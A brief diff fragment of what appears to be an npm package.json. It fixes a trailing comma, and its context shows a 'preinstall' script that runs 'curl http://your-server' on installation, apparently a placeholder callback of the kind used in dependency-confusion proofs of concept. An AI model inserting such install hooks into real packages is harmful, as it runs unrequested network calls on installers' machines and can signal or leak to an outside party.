@@ -8,5 +8,5 @@
     "preinstall": "curl http://your-server"
   },
   "author": "s1rn3tz",
-  "license": "ISC",
+  "license": "ISC"
 }
